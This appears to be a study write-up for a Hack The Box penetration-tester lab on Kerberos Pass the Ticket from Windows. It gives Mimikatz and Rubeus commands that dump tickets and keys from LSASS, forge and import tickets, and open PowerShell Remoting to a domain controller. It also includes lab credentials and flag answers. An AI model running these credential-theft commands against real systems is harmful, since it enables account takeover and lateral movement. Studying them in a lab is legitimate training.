### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Pass the Ticket (PtT) from Windows <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Pass the Ticket (PtT) from Windows



Kerberos = ticket-based; instead of sending a password to every service, the client presents a service-specific ticket.

| Ticket | Purpose |
|---|---|
| `TGT` (Ticket Granting Ticket) | Obtained by encrypting a timestamp with the user's password hash → from KDC |
| `TGS` (Service Ticket) | Requested with TGT to access a particular service |

PtT = present a stolen ticket (TGT or TGS) instead of authenticating from scratch.

#### Harvest tickets from LSASS — Mimikatz

```diff
+ mimikatz # privilege::debug
+ mimikatz # sekurlsa::tickets /export
```

<br>

Output: `.kirbi` files in CWD. Format `[luid]-N-N-flags-user@service-domain.kirbi`. Tickets ending in `$` = computer accounts. Tickets with service `krbtgt` = TGT for that user.

#### Rubeus dump — Base64 ticket export

```diff
+ c:\tools> Rubeus.exe dump /nowrap
```

<br>

Both tools require admin to grab everything.

#### Pass the Key / OverPass the Hash

Convert an NT hash / AES key into a TGT (cross-protocol). Mimikatz `sekurlsa::ekeys` dumps the user's Kerberos keys:

```diff
+ mimikatz # sekurlsa::ekeys
```

<br>

Then OverPass the Hash with mimikatz (admin required):

```diff
+ mimikatz # sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<NThash>
```

<br>

Or Rubeus `asktgt` (no admin required):

```diff
+ c:\tools> Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes256> /nowrap
```

<br>

Note: AES is preferred — using rc4_hmac (NTLM) on a 2008+ domain may trigger encryption-downgrade detection.

#### Pass the Ticket — multiple methods

Rubeus + `/ptt` — request and import in one step:

```diff
+ c:\tools> Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<NThash> /ptt
```

<br>

Import a `.kirbi` via Rubeus:

```diff
+ c:\tools> Rubeus.exe ptt /ticket:<filename>.kirbi
```

<br>

Convert `.kirbi` → Base64:

```diff
+ PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

<br>

Pass via Base64 string:

```diff
+ c:\tools> Rubeus.exe ptt /ticket:<base64>
```

<br>

Mimikatz import:

```diff
+ mimikatz # kerberos::ptt "<path-to-kirbi>"
```

<br>

#### PowerShell Remoting after PtT

```diff
+ c:\tools>powershell
+ PS C:\tools> Enter-PSSession -ComputerName DC01
```

<br>

Optional sacrificial logon session via Rubeus (preserves existing TGTs):

```diff
+ C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

<br>

---

<br>

### Exercise

IP: 10.129.126.191 — RDP as `Administrator` / `'AnotherC0mpl3xP4$$'`

---

### Question 1:
Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

RDP as admin, run mimikatz:

```diff
+ c:\tools>mimikatz.exe
+ mimikatz # privilege::debug
+ mimikatz # sekurlsa::tickets /export
```

<br>

#### Listing the dumped `.kirbi` files in `c:\tools\` shows three with user names (rest are computer accounts).

&#x1F6A9; found **3**.

---

### Question 2:
Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder `\\DC01.inlanefreight.htb\john`

```diff
+ mimikatz # kerberos::ptt "C:\tools\[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+ mimikatz # misc::cmd
```

<br>

In the new cmd window — temporarily map the share with `pushd`:

```diff
+ c:\Users\john>pushd \\DC01.inlanefreight.htb\john
+ Z:\>type john.txt
```

	Learn1ng_M0r3_Tr1cks_with_J0hn

```diff
+ Z:\>popd
```

&#x1F6A9; found **Learn1ng_M0r3--edit--_Tr1cks_with_J0hn**.

---

### Question 3:
Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

```diff
+ c:\tools>mimikatz.exe
+ mimikatz # privilege::debug
+ mimikatz # kerberos::ptt "[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+ mimikatz # exit
```

<br>

PSRemoting into DC01:

```diff
+ c:\tools>powershell
+ PS C:\tools> Enter-PSSession -ComputerName DC01
+ [DC01]: PS C:\Users\john\Documents> type C:\john\john.txt
```

	P4$$_th3_Tick3T_PSR

&#x1F6A9; found `P4$$_th3_Tick--edit--3T_PSR`.
